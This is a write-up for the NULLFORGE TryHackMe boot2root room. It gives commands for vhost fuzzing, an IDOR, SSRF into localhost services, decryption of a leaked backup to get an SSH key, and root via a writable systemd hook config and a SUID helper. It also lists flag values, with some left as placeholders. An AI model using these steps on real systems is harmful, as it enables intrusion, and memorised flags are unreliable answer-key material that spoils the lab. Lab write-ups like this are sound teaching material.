# NULLFORGE — Official Write-up

> **Room:** NULLFORGE  
> **TryHackMe:** https://tryhackme.com/room/nullforge  
> **Difficulty:** Hard  
> **Type:** Challenge / Boot2Root  
> **Target solve time:** ~120 minutes  
> **Flags:** 10

## Overview

NULLFORGE is a multi-stage Linux challenge built around a chain of web enumeration, virtual-host discovery, broken object authorization, server-side request forwarding, internal-service discovery, backup recovery, SSH access, and local privilege escalation.

The intended path is deliberately layered:

```text
Public web service
      |
      v
Virtual-host discovery
      |
      v
Deployment Console
      |
      v
Broken object authorization
      |
      v
Internal Operations API
      |
      v
SSRF
      |
      v
Internal Forge
      |
      v
Backup Service
      |
      v
Encrypted backup
      |
      v
SSH private key
      |
      v
ops
      |
      v
systemd timer / writable configuration
      |
      v
root execution
      |
      v
SUID helper
      |
      v
root
```

---

# Task 1 — THE FIRST SIGNAL

## 1. Reconnaissance

Start by identifying the exposed services:

```bash
nmap -Pn -sC -sV -p- MACHINE_IP
```

The intended external attack surface is:

```text
22/tcp  SSH
80/tcp  HTTP
```

The internal services are bound to localhost and should not appear in the external scan.

The web service is running on Nginx.

## 2. Enumerate the web application

Request the main page:

```bash
curl -i http://MACHINE_IP/
```

Interesting endpoints include:

```text
/status
/docs/operations
/fetch?url=
/assets/ops-manifest.json
```

Retrieve the manifest:

```bash
curl -s http://MACHINE_IP/assets/ops-manifest.json
```

The manifest exposes the application/build context and contains the first flag.

### Flag 01

```text
THM{NULLFORGE::01::11a66f85cac60040}
```

---

# Task 2 — THE RECORD THAT SHOULDN'T EXIST

## 3. Discover the hidden virtual host

The public application references an internal deployment platform, so enumerate candidate virtual hosts.

Example:

```bash
printf "www\nadmin\nportal\nconsole\nops\ndev\nstatus\ninternal\n" > /tmp/nullforge-vhosts.txt
```

Then:

```bash
ffuf -u http://MACHINE_IP/ -H "Host: FUZZ.nullforge.internal" -w /tmp/nullforge-vhosts.txt -fs 1609
```

The meaningful result is:

```text
console.nullforge.internal
```

Add it to the attacker machine if necessary:

```bash
echo "MACHINE_IP console.nullforge.internal" | sudo tee -a /etc/hosts
```

Then:

```bash
curl http://console.nullforge.internal/
```

## 4. Inspect the deployment record

The visible deployment is:

```text
NF-2026-041
```

Request it:

```bash
curl -s http://console.nullforge.internal/api/v1/deployments/NF-2026-041
```

The response contains a related deployment identifier.

The application does not properly enforce authorization on deployment identifiers. Request the related record directly:

```bash
curl -s http://console.nullforge.internal/api/v1/deployments/NF-2026-042
```

The second record exposes information belonging to another deployment, including an internal service address.

### Flag 02

```text
THM{NULLFORGE::02::<REPLACE_WITH_ACTUAL_FLAG>}
```

### Hidden deployment

```text
NF-2026-042
```

### Flag 03

```text
THM{NULLFORGE::03::<REPLACE_WITH_ACTUAL_FLAG>}
```

The record also reveals the internal Operations service:

```text
http://127.0.0.1:8081
```

---

# Task 3 — THE SERVICE BEHIND THE WALL

## 5. Identify the SSRF

The public application contains a remote resource inspection feature:

```text
/fetch?url=
```

Test it against an internal endpoint:

```bash
curl -i "http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/health"
```

A successful internal response confirms that the server is making the request on behalf of the attacker.

## 6. Operations API

Query the diagnostic endpoint:

```bash
curl -s "http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/api/v1/diagnostics"
```

The response contains the fourth flag.

### Flag 04

```text
THM{NULLFORGE::04::af6b2f3b96781803}
```

Enumerate the internal registry:

```bash
curl -s "http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/api/v1/registry"
```

The registry exposes:

```text
Forge   127.0.0.1:8082
Backup  127.0.0.1:9090
```

## 7. Internal Forge

Reach Forge through the same SSRF primitive:

```bash
curl -s "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/projects/nightly-backup"
```

The project points to the nightly backup workflow.

Retrieve the artifact manifest:

```bash
curl -s "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/artifacts/nightly-manifest.json"
```

The manifest identifies the backup backend and contains the fifth flag.

### Flag 05

```text
THM{NULLFORGE::05::c21e89a8dfa4f246}
```

---

# Task 4 — THE ARCHIVE THAT REMEMBERS

## 8. Enumerate the backup service

Use SSRF to reach the internal backup service:

```bash
curl -s "http://MACHINE_IP/fetch?url=http://127.0.0.1:9090/api/v1/backups/latest"
```

The response identifies:

```text
artifact: nightly-2026-09-24.tar.gz.enc
encryption: AES-256-CBC
job: nightly-backup
```

and exposes the sixth flag.

### Flag 06

```text
THM{NULLFORGE::06::b7889b6b4e5c7dbb3}
```

## 9. Retrieve the encrypted backup

```bash
curl -s "http://MACHINE_IP/fetch?url=http://127.0.0.1:9090/api/v1/download/nightly-2026-09-24" -o /tmp/nightly-2026-09-24.tar.gz.enc
```

## 10. Discover the decryption rule

The Forge repository exposes the backup policy:

```bash
curl -s "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/repositories/ops-backup-config/files/backup-policy.json"
```

The important information is:

```text
cipher: AES-256-CBC
KDF: PBKDF2
passphrase_rule: latest_commit + job_start_hhmm
```

The required values are:

```text
latest commit: 8f4c91a
job start:     02:15
```

Therefore:

```text
passphrase = 8f4c91a0215
```

No password brute force is required.

## 11. Decrypt the archive

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in /tmp/nightly-2026-09-24.tar.gz.enc -out /tmp/nightly-2026-09-24.tar.gz -pass pass:'8f4c91a0215'
```

List the contents:

```bash
tar -tzf /tmp/nightly-2026-09-24.tar.gz
```

The archive contains:

```text
home/ops/.ssh/id_ed25519
README.txt
flag07.txt
```

Extract:

```bash
mkdir -p /tmp/nullforge-backup
tar -xzf /tmp/nightly-2026-09-24.tar.gz -C /tmp/nullforge-backup
```

Read the seventh flag:

```bash
cat /tmp/nullforge-backup/flag07.txt
```

### Flag 07

```text
THM{NULLFORGE::07::2ffba60c06e3970a}
```

## 12. Recover the SSH key

Secure its permissions:

```bash
chmod 600 /tmp/nullforge-backup/home/ops/.ssh/id_ed25519
```

Use it to connect:

```bash
ssh -i /tmp/nullforge-backup/home/ops/.ssh/id_ed25519 ops@MACHINE_IP
```

Confirm:

```bash
whoami
```

Expected:

```text
ops
```

Read the user flag:

```bash
cat /home/ops/user.txt
```

### Flag 08

```text
THM{NULLFORGE::08::<REPLACE_WITH_ACTUAL_FLAG>}
```

---

# Task 5 — THE LAST SCHEDULE

## 13. Enumerate the local system

As `ops`:

```bash
id
```

The account belongs to:

```text
nf-maint
```

Enumerate timers:

```bash
systemctl list-timers --all | grep nullforge
```

The relevant timer is:

```text
nullforge-maint.timer
```

Inspect the service:

```bash
systemctl cat nullforge-maint.service
```

Important lines include:

```text
User=root
EnvironmentFile=/etc/nullforge/maint.env
ExecStart=/usr/local/sbin/nullforge-maint
```

Inspect the environment file:

```bash
cat /etc/nullforge/maint.env
```

The important configuration is:

```text
ROTATION_HOOK=/home/ops/.local/bin/nf-hook
ROTATION_MODE=nightly
```

Check permissions:

```bash
ls -l /etc/nullforge/maint.env
```

The file is writable by the `nf-maint` group.

The privileged systemd job therefore trusts the hook path from a configuration file that the low-privileged user can modify.

## 14. Follow the trusted hook

The maintenance job executes the configured hook as root.

The hook makes the stage-09 flag readable from the `ops` account and changes the permissions of:

```text
/usr/local/libexec/nullforge-report
```

Read the ninth flag:

```bash
cat /home/ops/.cache_stage09
```

### Flag 09

```text
THM{NULLFORGE::09::9072fc6d50f717fa}
```

## 15. Identify the SUID helper

Inspect:

```bash
ls -l /usr/local/libexec/nullforge-report
```

After the maintenance job has executed, the owner-execute position contains the SUID bit:

```text
-rwsr-xr-x
```

You can also search for it:

```bash
find /usr/local/libexec -perm -4000 -type f -ls
```

## 16. Obtain root

Execute:

```bash
/usr/local/libexec/nullforge-report
```

Verify:

```bash
whoami
```

Expected:

```text
root
```

and:

```bash
id
```

should show:

```text
uid=0(root)
```

## 17. Final flag

```bash
cat /root/root.txt
```

### Flag 10

```text
THM{NULLFORGE::10::<REPLACE_WITH_ACTUAL_FLAG>}
```

---

# Full Attack Path

```text
1. Enumerate target
        |
        v
2. Web application
        |
        v
3. Discover console.nullforge.internal
        |
        v
4. NF-2026-041
        |
        v
5. Access NF-2026-042
        |
        v
6. Discover internal Operations API
        |
        v
7. SSRF through /fetch
        |
        v
8. Operations registry
        |
        v
9. Internal Forge
        |
        v
10. Backup service
        |
        v
11. Encrypted archive
        |
        v
12. Derive passphrase from commit + time
        |
        v
13. Recover SSH key
        |
        v
14. SSH as ops
        |
        v
15. Enumerate systemd timers
        |
        v
16. Writable maintenance configuration
        |
        v
17. Root hook execution
        |
        v
18. SUID helper
        |
        v
19. root
```

# Flag Summary

| Flag | Milestone |
|---|---|
| FLAG 01 | Public application manifest |
| FLAG 02 | Deployment console |
| FLAG 03 | Unauthorized deployment record |
| FLAG 04 | Internal Operations API |
| FLAG 05 | Internal Forge |
| FLAG 06 | Backup service |
| FLAG 07 | Encrypted backup |
| FLAG 08 | `ops` foothold |
| FLAG 09 | Privilege-escalation stage |
| FLAG 10 | `/root/root.txt` |
